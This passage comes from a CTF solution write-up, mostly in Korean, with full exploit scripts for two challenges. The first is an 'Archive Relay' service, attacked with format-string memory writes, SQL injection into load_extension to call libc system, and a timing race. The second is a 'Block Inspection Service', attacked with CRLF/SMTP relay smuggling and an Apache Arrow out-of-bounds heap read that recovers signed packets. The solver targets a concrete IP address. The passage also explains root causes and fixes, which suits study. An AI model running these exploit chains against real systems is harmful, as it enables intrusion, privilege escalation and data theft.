    trace_socks = [socket.create_connection((host, port), timeout=2) for _ in notes]
    login_request = login_wire(host, port, library)
    trace_requests = [archive.raw_trace_request(host, port, session, note) for note in notes]
    if delay_us >= 0:
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
        busy_wait_us(delay_us)
        login_sock.sendall(login_request)
    else:
        login_sock.sendall(login_request)
        busy_wait_us(-delay_us)
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
    return recv_all([login_sock, *trace_socks])


def attempt(index: int, params: tuple[int, int, int, int, int], base_port: int) -> dict[str, object]:
    delay_us, trace_gap_us, gate_width, seed_tail, final_tail = params
    port = base_port + index
    run_dir = f"{ROOT}/root_sh_sweep/{index:03d}_{delay_us:+05d}_{trace_gap_us}_{gate_width}_{seed_tail}_{final_tail}"
    os.makedirs(run_dir, exist_ok=True)
    log_handle = open(f"{run_dir}/prob.log", "wb")
    process = subprocess.Popen(
        [PROB, str(port)],
        cwd=run_dir,
        stdin=subprocess.DEVNULL,
        stdout=log_handle,
        stderr=subprocess.STDOUT,
    )
    try:
        wait_port(port)
        session = archive.login(port)
        enable = archive.write_note(0x32, 0x07, "hhn")
        status, body = archive.trace(port, session, enable)
        if status != 202:
            raise RuntimeError((status, body))
        time.sleep(0.08)
        notes = [
            f"%{gate_width}c",
            archive.write_note(0x02, 0x2A20, "n", tail_width=seed_tail),
            marker_final_note(final_tail),
        ]
        library = "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3"
        responses = race(port, session, notes, delay_us, trace_gap_us, library)
        time.sleep(0.08)
        won = os.path.exists(f"{run_dir}/PWNED")
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": won,
            "alive": process.poll() is None,
            "response_lengths": [len(item) for item in responses],
        }
    except Exception as error:
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": False,
            "alive": process.poll() is None,
            "error": repr(error),
        }
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                process.kill()
        log_handle.close()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, default=160)
    parser.add_argument("--base-port", type=int, default=19600)
    args = parser.parse_args()
    grid = [
        (delay, trace_gap, gate, seed_tail, final_tail)
        for delay in (-3000, -2000, -1500, -1000, -500, 0, 250, 500, 750, 1000, 1500)
        for trace_gap in (100, 250, 500, 1000)
        for gate in (200000, 500000, 1000000, 1500000)
        for seed_tail in (0, 100000, 300000, 500000)
        for final_tail in (100000, 500000)
    ]
    random.Random(0x5348).shuffle(grid)
    results: list[dict[str, object]] = []
    for index, params in enumerate(grid[: args.limit]):
        row = attempt(index, params, args.base_port)
        results.append(row)
        print(json.dumps(row, sort_keys=True), flush=True)
        if row.get("won"):
            break
    with open(f"{ROOT}/root_sh_sweep_results.json", "w", encoding="utf-8") as handle:
        json.dump(results, handle, indent=2, sort_keys=True)


if __name__ == "__main__":
    main()
```

#### `archive_flag_agent.py`

```python
#!/usr/bin/env python3
"""Archive Relay post-system exploit/probe helpers (flag-path agent)."""

from __future__ import annotations

import argparse
import http.client
from pathlib import Path
import re
import select
import socket
import subprocess
import time
import urllib.parse


def request(port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    conn.close()
    return response.status, data


def login(port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        port,
        "POST",
        "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        port,
        "POST",
        "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def positional_probe(start: int, end: int) -> str:
    # Two hexadecimal-looking digits immediately after '%' satisfy the edge
    # validator; wider indices naturally begin with two decimal/hex digits.
    fields = []
    for position in range(start, end + 1):
        if position < 10:
            spec = f"%0{position}$p"
        else:
            spec = f"%{position}$p"
        fields.append(f"{position}={spec}")
    return ",".join(fields)


def write_note(
    target_offset: int,
    value: int,
    final_spec: str,
    *,
    prefix_len: int = 67,
    db_low: int = 0x08,
    tail_width: int = 0,
) -> str:
    """Retarget arg179 through arg153, then perform one DB write."""
    target_low = (db_low + target_offset) & 0xFF
    first_width = (target_low - prefix_len) & 0xFF
    if first_width == 0:
        first_width = 256
    first_count = prefix_len + first_width
    if final_spec == "hhn":
        second_width = (value - first_count) & 0xFF
        if second_width == 0:
            second_width = 256
    elif final_spec in {"hn", "n"}:
        second_width = value - first_count
        if second_width <= 0:
            raise ValueError((value, first_count))
    else:
        raise ValueError(final_spec)

    chunks = [f"%{first_width}c"]
    chunks.extend(["%.s"] * 151)          # args2..152
    chunks.append("%hhn")                 # arg153: arg179 -> db+offset
    chunks.append(f"%{second_width}c")    # arg154
    chunks.extend(["%.s"] * 24)           # args155..178
    chunks.append(f"%{final_spec}")       # arg179: DB write
    if tail_width:
        chunks.append(f"%{tail_width}c")  # arg180: hold shared audit mutex
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def final_audit_note(prefix_len: int = 67, socket_fd: int = 6) -> str:
    """Emit a cp line and finish db[0:2] = ``b'sh'`` with one %hn.

    A preceding trace writes db[2:6] = ``b' *\\0\\0'``.  After the %hn,
    a bounded 500KB pad keeps this worker inside fprintf so the racing
    load_extension thread can call system while the command is complete.
    """
    if prefix_len != 67:
        raise ValueError("this compact layout assumes a one-digit worker/count prefix")
    chunks = ["%199c"]                       # arg1: count 266, low LF
    chunks.extend(["%.s"] * 135)            # args2..136
    chunks.append("%hhn")                    # arg137 -> arg185 = LF
    chunks.append("%254c")                   # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)             # args139..152
    chunks.append("%hhn")                    # arg153 -> arg179 = db+0
    chunks.append("%2c")                     # arg154, count low LF
    chunks.extend(["%.s"] * 9)              # args155..163
    chunks.append("%hhn")                    # arg164 -> arg183 = LF
    chunks.extend(["%.s"] * 5)              # args165..169
    chunks.append("%hhn")                    # arg170 -> arg177 = LF
    chunks.extend(["%.s"] * 6)              # args171..176
    chunks.append("%c")                      # arg177 -> LF, count 523
    chunks.append(f"cp /flag /proc/self/fd/{socket_fd} ")
    chunks.append("%31$c")                   # fixed '#' begins shell comment
    chunks.append("%07$26190c")              # total count 0x6873
    chunks.append("%179$hn")                 # db[0:2] = 's', 'h'
    chunks.append("%183$c")                  # cached LF ends comment
    chunks.append("cp /flag /proc/self/fd/6 ")
    chunks.append("%31$c")                   # comment second command's padding
    chunks.append("%07$500000c")             # post-write race window
    chunks.append("%185$c")                  # cached LF
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def trigger_load_extension(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    # One form decode plus the target's repeated account canonicalization.
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    wire = (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body
    captured = bytearray()
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(wire)
        sock.settimeout(2)
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            captured.extend(chunk)
    return bytes(captured)


def raw_trace_request(host: str, port: int, session: str, note: str) -> bytes:
    return (
        f"POST /api/trace HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"X-Session: {session}\r\n"
        f"X-Trace-Note: {note}\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n"
    ).encode()


def raw_trigger_request(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sock: socket.socket, timeout: float = 1.0) -> bytes:
    result = bytearray()
    sock.settimeout(timeout)
    while True:
        try:
            part = sock.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not part:
            break
        result.extend(part)
    return bytes(result)


def race_final_traces(
    host: str,
    port: int,
    session: str,
    notes: list[str],
    trigger_after_trace: float,
) -> tuple[bytes, bytes]:
    # Connect the login socket first so it receives the stable server FD 6.
    login_sock = socket.create_connection((host, port), timeout=3)
    time.sleep(0.005)
    trace_socks = [socket.create_connection((host, port), timeout=3) for _ in notes]
    login_wire = raw_trigger_request(host, port)
    trace_wires = [raw_trace_request(host, port, session, note) for note in notes]

    def send_traces() -> None:
        for sock, wire in zip(trace_socks, trace_wires):
            sock.sendall(wire)

    start = time.perf_counter()
    if trigger_after_trace >= 0:
        send_traces()
        # A readable 202 response means each request was parsed and its worker
        # was queued.  This keeps the final waiter ahead of xDlSym on the
        # shared mutex instead of relying only on socket-send order.
        pending = set(trace_socks)
        queue_deadline = time.perf_counter() + 0.25
        while pending and time.perf_counter() < queue_deadline:
            ready, _, _ = select.select(list(pending), [], [], 0.001)
            pending.difference_update(ready)
        target = time.perf_counter() + trigger_after_trace
        while time.perf_counter() < target:
            pass
        login_sock.sendall(login_wire)
    else:
        login_sock.sendall(login_wire)
        target = start - trigger_after_trace
        while time.perf_counter() < target:
            pass
        send_traces()
    login_data = recv_all(login_sock)
    trace_data = b"\n---NEXT-TRACE---\n".join(recv_all(sock) for sock in trace_socks)
    login_sock.close()
    for sock in trace_socks:
        sock.close()
    return login_data, trace_data


def exploit(
    host: str,
    port: int,
    *,
    prefix_len: int = 67,
    socket_fd: int = 6,
    race_delay: float | None = None,
) -> bytes:
    if host not in {"127.0.0.1", "localhost"}:
        raise ValueError("trace helper currently uses local HTTPConnection")
    session = login(port)
    notes = [
        write_note(0x32, 0x07, "hhn", prefix_len=prefix_len),
        # 0x092a20 -> b' *\\t\\0': the 600KB pre-write span is also the
        # mutex gate while pVfs is still intact.
        write_note(0x02, 0x092A20, "n", prefix_len=prefix_len, tail_width=500000),
        final_audit_note(prefix_len, socket_fd),
    ]
    # Only the flag-enabling write is safe before load_extension resolves the
    # entrypoint.  The remaining snapshots form gate -> db[2:6] -> db[0:2].
    for index, note in enumerate(notes[:1], 1):
        status, data = trace(port, session, note)
        print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
        if status != 202:
            raise RuntimeError((index, status, data))
        time.sleep(0.08)
    if race_delay is None:
        for index, note in enumerate(notes[1:], 2):
            status, data = trace(port, session, note)
            print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
            time.sleep(0.08)
        return trigger_load_extension(host, port)
    race_notes = notes[1:]
    login_data, trace_data = race_final_traces(host, port, session, race_notes, race_delay)
    print(f"trace_race_raw={trace_data!r}")
    return login_data + b"\n---TRACE-SOCKET---\n" + trace_data


def local_race_sweep(binary: str, delays_us: list[int], base_port: int = 18100) -> None:
    workdir = "/tmp/archive_flag_race"
    for index, delay_us in enumerate(delays_us):
        port = base_port + index
        process = subprocess.Popen(
            [binary, str(port)],
            cwd=workdir,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            deadline = time.monotonic() + 2
            while True:
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                        break
                except OSError:
                    if time.monotonic() >= deadline:
                        raise
            data = exploit(
                "127.0.0.1",
                port,
                race_delay=delay_us / 1_000_000,
            )
            match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", data)
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} flag={match.group(0) if match else None} data={data[:200]!r}")
            if match:
                return
        except Exception as error:
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} error={error!r}")
        finally:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    process.kill()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=18083)
    parser.add_argument("--probe", nargs=2, type=int, metavar=("START", "END"))
    parser.add_argument("--note")
    parser.add_argument("--final-note", action="store_true")
    parser.add_argument("--prefix-len", type=int, default=67)
    parser.add_argument("--socket-fd", type=int, default=6)
    parser.add_argument("--exploit", action="store_true")
    parser.add_argument("--race-delay-us", type=int)
    parser.add_argument("--race-sweep", nargs="+", type=int)
    parser.add_argument(
        "--binary",
        default=str(Path(__file__).resolve().parent / "package" / "deploy" / "prob"),
    )
    args = parser.parse_args()

    if args.race_sweep:
        local_race_sweep(args.binary, args.race_sweep, args.port)
        return
    if args.exploit:
        captured = exploit(
            "127.0.0.1",
            args.port,
            prefix_len=args.prefix_len,
            socket_fd=args.socket_fd,
            race_delay=(None if args.race_delay_us is None else args.race_delay_us / 1_000_000),
        )
        print(captured)
        match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", captured)
        if match:
            print(f"FLAG={match.group().decode(errors='replace')}")
        return

    session = login(args.port)
    if args.probe:
        note = positional_probe(*args.probe)
    elif args.final_note:
        note = final_audit_note(args.prefix_len, args.socket_fd)
    elif args.note is not None:
        note = args.note
    else:
        raise SystemExit("provide --probe START END or --note NOTE")
    if len(note) > 760:
        raise SystemExit(f"note too long: {len(note)}")
    print(f"session={session} note_len={len(note)}")
    print(trace(args.port, session, note))


if __name__ == "__main__":
    main()
```

---

## 5. Block Inspection Service

### 결과

- 최종 플래그: `FLAG{param_y4rd_0v3rturn_th3_ncr_v1a_smuggl3_cha1n}`
- CTFd 문제 ID: `8`
- CTFd 검증: `solved_by_me: true`
- 핵심 체인: 내부 릴레이 프로토콜 스머글링 → `reviewer_assist` 획득 → 정상 PASS 워크북으로 서명 패킷 발급 → Arrow 고정폭 배열 OOB 읽기 → 패킷 회수·제출

### 1. 공격 표면

새 계정에서 검사를 시작한 뒤 즉시 종료하면 결과는 `FAIL`이 된다. 이 검사에 재검사 요청을 만들면 `queued` 상태의 `review_id`를 얻는다.

QA 경로는 처음에는 다음 오류로 막혀 있다.

```json
{"error":"reviewer_assist_required"}
```

연동 안내와 실제 요청을 대조하면 `/captures/import`가 `capture_metadata_url`, `import_channel`을 받아 내부 `gauge-relay:2525`와 통신한다. `import_channel`에 CRLF를 넣을 수 있어, 채널 이름 뒤에 SMTP 형태의 전체 세션을 붙일 수 있었다.

### 2. `reviewer_assist` 권한 획득

재검사에 묶을 이벤트 JSON은 다음과 같다.

```json
{
  "timeline": [{"decision": "routine"}],
  "review": {"timeline": [{"decision": "escalate"}]},
  "permissions": [{"grant": "viewer"}],
  "pack": {"permissions": [{"grant": "assessor"}]}
}
```

이를 Base64url로 인코딩해 `X-Yard-Ops-Event` 레코드에 넣고, `import_channel` 뒤에 SMTP 세션을 이어 붙인다.

```text
coatmetrics-v2\r\n
EHLO coatmetrics-provider\r\n
MAIL FROM:<provider@coatmetrics.local>\r\n
RCPT TO:<gauge-relay@gauge-relay.local>\r\n
DATA\r\n
X-Yard-Ops-Event: import=<KEY>;review=<REVIEW_ID>;eventState=pending;eventKind=coating-defect;eventTag=escalate;autoApprove=false;event=<BASE64URL_JSON>\r\n
.\r\n
QUIT\r\n
```

요청의 핵심 필드는 아래와 같다. 외부 서버나 세션 쿠키 반출은 필요하지 않다.

```json
{
  "review_id": "review_...",
  "import_key": "assist...",
  "capture_metadata_url": "http://gauge-relay:2525/",
  "import_channel": "coatmetrics-v2\r\n<SMTP SESSION>",
  "headers": {}
}
```

처리가 끝나면 재검사 목록에 `/rechecks/<REVIEW_ID>/redeem` 링크가 생긴다. 이 경로를 POST하면 다음 응답과 함께 QA 작업공간이 열린다.

```json
{"ok":true,"role":"reviewer_assist"}
```

### 3. 정상 PASS 판정 패킷 발급

`POST /qa/workbooks/preview`는 Arrow IPC 또는 Feather 파일을 받고, 처리할 때 봉인 판정 패킷 한 건을 대기열에 넣는다. 먼저 다음 스키마로 2,048개의 정상 PASS 행을 올린다.

| 열 | 타입 | 값 |
| --- | --- | --- |
| `inspection_id` | non-null string | 현재 계정의 검사 ID |
| `outcome` | non-null string | `PASS` |
| `measured_avg` | non-null float64 | `100.0` |
| `spec_min` | non-null float64 | `1.0` |

서버 응답은 `declared_rows=2048`, `rows_returned=2048`이며, 이 시점에 자기 계정·검사·재검사에 귀속된 유효한 PASS 패킷이 발급된다. UI에는 패킷 본문이 표시되지 않고 대기열 개수만 보인다.

### 4. Arrow 고정폭 배열 OOB 읽기

QA 설명에는 “컨테이너 헤더가 선언한 행 수를 그대로 쓰고 파일 길이로 다시 계산하지 않으며 최대 2,048행을 돌려준다”는 문구가 있었다. 이 동작을 그대로 이용한다.

1. `fixed_size_binary(64)` 타입의 `measurement` 열과 실제 행 한 개(`A` 64바이트)를 가진 Arrow IPC 파일을 만든다.
2. RecordBatch FlatBuffer의 `RecordBatch.length`를 `1`에서 `2048`로 바꾼다.
3. 같은 배치의 `FieldNode.length`도 `1`에서 `2048`로 바꾼다.
4. 물리 데이터 버퍼 길이는 64바이트 그대로 둔다.

현재 PyArrow가 만든 538바이트 파일에서는 두 필드가 각각 파일 오프셋 `216`, `272`에 있었다. 최종 솔버는 이 값을 하드코딩하지 않고 FlatBuffer 구조를 따라가 동적으로 찾는다.

```text
logical rows       = 2048
physical rows      = 1
bytes per row      = 64
physical buffer    = 64 bytes
server return size = 2048 × 64 = 131072 bytes
```

Arrow reader는 파일을 열 때 이 불일치를 거부하지 않았고, 서버는 배열을 곧바로 JSON 행으로 변환했다. `fixed_size_binary` 값은 응답에서 Base64 문자열이므로 각 행을 디코딩해 이어 붙이면 워커 프로세스의 인접 힙 메모리 128 KiB를 복원할 수 있다.

가변 길이 문자열 타입은 별도의 오프셋 벡터도 필요해 프로세스 오류만 일으켰다. 반면 고정폭 타입은 시작 주소에서 `행 수 × 폭`만큼 직선으로 읽기 때문에 안정적으로 OOB 데이터를 반환했다.

### 5. 서명 패킷 추출과 제출

누출된 메모리에는 다음 형식의 봉인 패킷이 그대로 남아 있었다.

```text
base64url(JSON).<64자리 hex 서명>
```

디코딩한 JSON의 주요 필드는 다음과 같다.

```json
{
  "certificate_id": "pkt_...",
  "inspection_id": "match_...",
  "review_id": "review_...",
  "kind": "conformance_decision_packet",
  "outcome": "PASS",
  "measured_avg": 100,
  "spec_min": 1,
  "player_id": "usr_...",
  "tenant_id": "tenant_..."
}
```

다른 사용자 패킷도 같은 힙에서 보일 수 있으므로 다음 조건을 모두 확인해야 한다.

- `inspection_id`가 현재 계정의 검사와 같음
- `review_id`가 현재 계정의 재검사와 같음
- `kind == "conformance_decision_packet"`
- `outcome == "PASS"`

대기열 한도는 4개다. 최종 솔버는 정상 PASS 워크북 한 건 뒤에 128 KiB 고정폭 정상 배치 한 건으로 힙을 매핑하고, 남은 두 자리에서 OOB 요청을 최대 두 번 보낸다. 회수한 전체 토큰을 다음과 같이 제출한다.

```http
POST /qa/decision-packets/submit
Content-Type: application/json

{"packet":"<RECOVERED_SIGNED_PACKET>"}
```

새 계정에서는 원장에 PASS가 반영된다. 이미 같은 패킷이 반영된 상태에서 재전송하면 HTTP 409와 `record_state: "unchanged"`가 올 수 있지만, 대시보드와 QA 작업공간에는 정산 완료 상태와 플래그가 렌더링된다.

### 6. 자동 솔버

요구 패키지:

```bash
python -m pip install requests pyarrow
```

실행:

```bash
python solve.py --base http://43.203.187.40:8080
```

표준 진입점인 `solve.py`는 같은 폴더의 실제 구현 `solver.py`를 호출해 다음을 순서대로 자동화한다.

1. 임시 계정 생성
2. FAIL 검사와 재검사 생성
3. 내부 릴레이에 이벤트 프로토콜 스머글링
4. `reviewer_assist` 수령
5. 2,048행 정상 PASS 워크북 업로드
6. 정상 고정폭 배치로 128 KiB 힙 영역 매핑
7. 1행 `fixed_size_binary(64)` 파일의 논리 행 수를 2,048로 변조
8. Base64 응답 128 KiB 복원
9. 자기 검사에 귀속된 서명 PASS 패킷 선택
10. 패킷 제출 후 페이지에서 플래그 추출

오프라인 검증 결과는 다음과 같다.

```text
PASS workbook: 2048 rows
malformed IPC: 538 bytes
logical OOB rows: 2048
decoded response memory: 131072 bytes
patched FlatBuffer offsets: 216, 272
```

### 7. 근본 원인과 수정 방향

취약점은 두 경계가 연쇄적으로 무너져 발생했다.

1. `import_channel`의 개행을 차단하지 않아 신뢰된 내부 릴레이 프로토콜에 임의 레코드를 주입할 수 있었다.
2. Arrow IPC 메타데이터의 논리 길이를 신뢰하고, 물리 버퍼 크기와의 정합성을 검사하지 않은 채 행을 직렬화했다.

수정 시에는 `import_channel`을 고정된 열거형으로 검증하고 CR/LF를 거부해야 한다. Arrow 파일은 처리 전에 레코드 배치와 모든 배열을 완전 검증하고, 각 고정폭 버퍼가 최소 `length × byte_width` 바이트인지 확인해야 한다. 파싱 워커에는 서명 키나 다른 요청의 판정 패킷을 같은 힙에 두지 않는 격리도 필요하다.

### 8. 확인 근거

- `bis_child_fixed_width_overread_result.json`: 128 KiB OOB 응답과 서명 패킷 흔적
- `bis_root_oob_hunt_result.json`: 반복 누출 중 복원한 완전한 PASS 패킷
- `bis_child_redeem_leaked_packet_result.json`: 검사 PASS 상태 및 플래그가 렌더링된 페이지
- `bis_ctfd_submit_result.json`: CTFd의 `solved_by_me: true` 확인
- `arrow_uint8_leak_probe_result.json`: 1바이트 물리 버퍼에서 2,048바이트를 읽는 최소 로컬 재현

최종 플래그:

```text
FLAG{param_y4rd_0v3rturn_th3_ncr_v1a_smuggl3_cha1n}
```


### 9. 최종 풀이 코드 전체

표준 진입점과 실제 구현을 모두 싣는다. 계정·세션·토큰은 하드코딩하지 않으며 실행 중 새 임시 계정을 만든다.

#### `solve.py`

````python
#!/usr/bin/env python3
"""Compatibility entry point for the final Block Inspection Service solver."""

from solver import main


if __name__ == "__main__":
    raise SystemExit(main())
````

#### `solver.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON Block Inspection Service.

The solver creates a disposable portal account, acquires reviewer-assist,
uses an Arrow fixed-width over-read to recover its signed decision packet,
submits the packet, and prints the flag.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import secrets
import struct
import sys
import time
from dataclasses import dataclass

import pyarrow as pa
import pyarrow.ipc as ipc
import requests


DEFAULT_BASE = "http://43.203.187.40:8080"
LEAK_ROWS = 2048
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]{1,300}\}", re.I)
PACKET_RE = re.compile(rb"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{100,})\.([0-9a-f]{64})(?![0-9a-f])")


@dataclass
class Principal:
    username: str
    password: str
    inspection_id: str
    review_id: str


def require(response: requests.Response, label: str) -> requests.Response:
    if response.status_code >= 400:
        raise RuntimeError(
            f"{label}: HTTP {response.status_code}: {response.text[:1000]}"
        )
    return response


def b64url_encode_json(value: object) -> str:
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def register(base: str, session: requests.Session) -> tuple[str, str]:
    # Keep all three unique identity fields well below the portal's length cap.
    nonce = f"{int(time.time())}{secrets.token_hex(3)}"
    username = "aleak" + nonce
    password = "BIS_" + secrets.token_hex(16)
    response = require(
        session.post(
            base + "/register",
            data={
                "username": username,
                "password": password,
                "display_name": "Arrow packet recovery",
                "handle": username,
                "vendor_name": "Arrow packet recovery",
            },
            timeout=20,
        ),
        "register",
    )
    if "/login" in response.url:
        response = require(
            session.post(
                base + "/login",
                data={"username": username, "password": password},
                timeout=20,
            ),
            "login",
        )
        if "/login" in response.url:
            raise RuntimeError("login did not create an authenticated session")
    print(f"[+] account: {username}", flush=True)
    return username, password


def create_failed_inspection(base: str, session: requests.Session) -> str:
    started = require(
        session.post(
            base + "/inspections",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "start inspection",
    ).json()
    inspection_id = started["inspection"]["id"]
    finished = require(
        session.post(
            base + f"/inspections/{inspection_id}/finish",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "finish inspection",
    ).json()
    outcome = (finished.get("inspection", {}).get("result") or {}).get("outcome")
    if outcome != "FAIL":
        raise RuntimeError(f"expected a fresh FAIL inspection, got {outcome!r}")
    print(f"[+] failed inspection: {inspection_id}", flush=True)
    return inspection_id


def gain_reviewer_assist(
    base: str, session: requests.Session, inspection_id: str
) -> str:
    nonce = secrets.token_hex(8)
    review = require(
        session.post(
            base + "/rechecks",
            data={
                "inspection_id": inspection_id,
                "title": "Reviewer assist " + nonce,
                "evidence_html": "<section>Controlled review package.</section>",
                "renderer": "timeline",
                "variant": "scoreboard",
            },
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "create recheck",
    ).json()
    review_id = review["id"]
    if review.get("status") != "queued":
        raise RuntimeError(f"new recheck is not queued: {review!r}")

    # This is the exact document shape that places the review in
    # assist_granted. Redeeming it turns on the QA reviewer-assist seat.
    event = {
        "timeline": [{"decision": "routine"}],
        "review": {"timeline": [{"decision": "escalate"}]},
        "permissions": [{"grant": "viewer"}],
        "pack": {"permissions": [{"grant": "assessor"}]},
    }
    import_key = "assist" + nonce
    record = (
        f"X-Yard-Ops-Event: import={import_key};review={review_id};"
        "eventState=pending;eventKind=coating-defect;eventTag=escalate;"
        "autoApprove=false;event=" + b64url_encode_json(event)
    )
    smtp = "\r\n".join(
        (
            "EHLO coatmetrics-provider",
            "MAIL FROM:<provider@coatmetrics.local>",
            "RCPT TO:<gauge-relay@gauge-relay.local>",
            "DATA",
            record,
            ".",
            "QUIT",
            "",
        )
    )
    imported = require(
        session.post(
            base + "/captures/import",
            json={
                "review_id": review_id,
                "import_key": import_key,
                "capture_metadata_url": "http://gauge-relay:2525/",
                "import_channel": "coatmetrics-v2\r\n" + smtp,
                "headers": {},
            },
            headers={"Accept": "application/json"},
            timeout=30,
        ),
        "relay import",
    ).json()
    print(f"[+] relay accepted: {json.dumps(imported, separators=(',', ':'))}", flush=True)

    redeem_path = f"/rechecks/{review_id}/redeem"
    for _ in range(80):
        page = require(session.get(base + "/rechecks", timeout=20), "list rechecks").text
        if redeem_path in page:
            break
        time.sleep(0.25)
    else:
        raise RuntimeError("assist_granted redeem link did not appear")

    redeemed = require(
        session.post(
            base + redeem_path,
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "redeem reviewer assist",
    )
    print(f"[+] reviewer assist redeemed: {redeemed.text[:500]}", flush=True)
    return review_id


def align8(value: int) -> int:
    return (value + 7) & ~7


def make_pass_arrow(inspection_id: str) -> bytes:
    """Build the known-good workbook that causes one signed PASS packet."""
    count = LEAK_ROWS
    schema = pa.schema(
        [
            pa.field("inspection_id", pa.string(), nullable=False),
            pa.field("outcome", pa.string(), nullable=False),
            pa.field("measured_avg", pa.float64(), nullable=False),
            pa.field("spec_min", pa.float64(), nullable=False),
        ]
    )
    batch = pa.record_batch(
        [
            pa.array([inspection_id] * count, type=pa.string()),
            pa.array(["PASS"] * count, type=pa.string()),
            pa.array([100.0] * count, type=pa.float64()),
            pa.array([1.0] * count, type=pa.float64()),
        ],
        schema=schema,
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def prime_pass_packet(base: str, session: requests.Session, inspection_id: str) -> dict:
    """Queue a valid, account-bound PASS packet before reading stale heap data."""
    workbook = make_pass_arrow(inspection_id)
    response = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=workbook,
            headers={"Content-Type": "application/octet-stream", "Accept": "application/json"},
            timeout=50,
        ),
        "prime PASS workbook",
    ).json()
    if response.get("declared_rows") != LEAK_ROWS or response.get("rows_returned") != LEAK_ROWS:
        raise RuntimeError(f"PASS workbook was not fully accepted: {response!r}")
    summary = {key: value for key, value in response.items() if key != "rows"}
    print(f"[+] PASS packet primed: {json.dumps(summary, separators=(',', ':'))}", flush=True)
    return summary


def u16(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<H", data, offset)[0]


def u32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def i32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<i", data, offset)[0]


def i64(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<q", data, offset)[0]


def flatbuffer_fields(data: bytes | bytearray, table: int) -> list[int]:
    vtable = table - i32(data, table)
    count = (u16(data, vtable) - 4) // 2
    return [u16(data, vtable + 4 + index * 2) for index in range(count)]


def message_body_length(metadata: bytes | bytearray) -> int:
    root = u32(metadata, 0)
